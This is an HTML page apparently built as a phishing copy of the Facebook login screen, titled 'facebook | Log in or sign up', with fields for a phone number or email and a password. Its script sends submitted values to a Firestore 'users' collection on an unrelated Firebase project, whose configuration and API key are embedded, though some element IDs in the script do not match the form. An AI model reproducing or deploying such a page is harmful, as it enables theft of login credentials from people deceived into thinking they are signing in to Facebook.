<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> facebook | Log in or sign up</title>
    
    <style>
        /* --- Global Styles & Body --- */
        :root {
            --primary-blue: #1877f2;
            --primary-green: #42b72a;
            --green-hover: #36a420;
            --bg-gray: #f0f2f5;
            --card-bg: #ffffff;
            --text-dark: #1c1e21;
            --border-gray: #dddfe2;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: var(--bg-gray);
            color: var(--text-dark);
        }

        /* --- Main Layout Container --- */
        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .content-wrapper {
            display: flex;
            align-items: center;
            justify-content: space-around;
            width: 100%;
            max-width: 1000px;
        }
        
        /* --- Left Side: Brand Section --- */
        .brand-section {
            padding-right: 70px;
            flex-basis: 580px;
            text-align: center; /* Center align all content inside */
        }

        /* --- NEW: Logo Image Style --- */
        .brand-logo-img {
            width: 70px;                  /* ছবির প্রস্থ */
            height: 70px;                 /* ছবির উচ্চতা */
            border-radius: 50%;            /* ছবিটিকে গোলাকার করার জন্য */
            object-fit: cover;             /* ছবি যেন চ্যাপ্টা না হয়ে যায় */
            margin: 0 auto 15px;           /* উপরে-নিচে স্পেস এবং মাঝখানে আনার জন্য */
            display: block;                /* মাঝখানে আনার জন্য এটি জরুরি */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* হালকা ছায়া */
        }

        .brand-section .logo {
            font-size: 56px;
            font-weight: bold;
            color: var(--primary-blue);
            margin-bottom: 10px;
        }

        .brand-section .tagline {
            font-size: 28px;
            line-height: 1.2;
        }

        /* --- Right Side: Form Section --- */
        .form-section {
            flex-basis: 400px;
            text-align: center;
        }

        .form-card {
            background-color: var(--card-bg);
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        input[type="text"], input[type="email"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border-radius: 6px;
            border: 1px solid var(--border-gray);
        }

        input[type="text"]:focus, input[type="email"]:focus {
            outline: none;
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .submit-btn {
            background-color: var(--primary-blue);
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: var(--green-hover);
        }

        .divider {
            border-bottom: 1px solid var(--border-gray);
            margin: 20px 16px;
        }

        #success-message {
            color: var(--primary-green);
            font-weight: bold;
            margin-top: 15px;
            display: none;
        }

        /* --- Responsive Design --- */
        @media (max-width: 900px) {
            .content-wrapper {
                flex-direction: column;
            }
            .brand-section {
                flex-basis: auto;
                padding-right: 0;
                margin-bottom: 40px;
            }
            .brand-section .logo {
                font-size: 48px;
            }
            .brand-section .tagline {
                font-size: 24px;
            }
            .form-section {
                flex-basis: auto;
                width: 100%;
                max-width: 400px;
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="content-wrapper">
            <!-- Left side with Brand Name and Tagline -->
            <div class="brand-section">
                <!-- NEW: Logo Image Added Here -->
                <img src="logo.png" alt="ConnectHub Logo" class="brand-logo-img">
                
                <h1 class="logo"></h1>
                <h2 class="tagline"></h2>
            </div>

            <!-- Right side with the Form -->
            <div class="form-section">
                <div class="form-card">
                    <form id="submissionForm">
                        <div class="form-group">
                            <input type="text" id="Mobile number or email " placeholder="Mobile number or email " required>
                        </div>
                        <div class="form-group">
                            <input type="email" id="password" placeholder="password" required>
                        </div>
                        <div class="divider"></div>
                        <button type="submit" class="submit-btn">log in</button>
                    </form>
                    <p id="success-message"></p>
                </div>
            </div>
        </div>
    </div>

    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <script>
        // --- Firebase Configuration ---
        // IMPORTANT: Replace with your project's configuration
        const firebaseConfig = {
  apiKey: "AIzaSyCe5RIU06w1t3usQLcQTyLnRU9OTwK2BgM",
  authDomain: "vidpro-f60ff.firebaseapp.com",
  databaseURL: "https://vidpro-f60ff-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "vidpro-f60ff",
  storageBucket: "vidpro-f60ff.firebasestorage.app",
  messagingSenderId: "179223374272",
  appId: "1:179223374272:web:d7268692920b12a49a8025",
  measurementId: "G-2J1GLCWHG1"
};

        // --- JavaScript logic for form submission (same as before) ---
        try {
            firebase.initializeApp(firebaseConfig);
            const db = firebase.firestore();

            const submissionForm = document.getElementById('submissionForm');
            const successMessage = document.getElementById('success-message');

            submissionForm.addEventListener('submit', async (e) => {
                e.preventDefault(); 

                const name = document.getElementById('fullName').value.trim();
                const email = document.getElementById('email').value.trim();

                if (!name || !email) {
                    alert('Please fill out both fields.');
                    return;
                }

                try {
                    await db.collection("users").add({
                        name: name,
                        email: email,
                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
                    });
                    successMessage.style.display = 'block';
                    submissionForm.reset();
                    setTimeout(() => { 
                        successMessage.style.display = 'none'; 
                    }, 4000);
                } catch (error) {
                    console.error("Error adding document: ", error);
                    alert("An error occurred while submitting. Please try again.");
                }
            });
        } catch (e) {
            console.error("Firebase initialization failed:", e);
            alert("Could not connect to the database. Please check your configuration.");
        }
    </script>
</body>
</html>
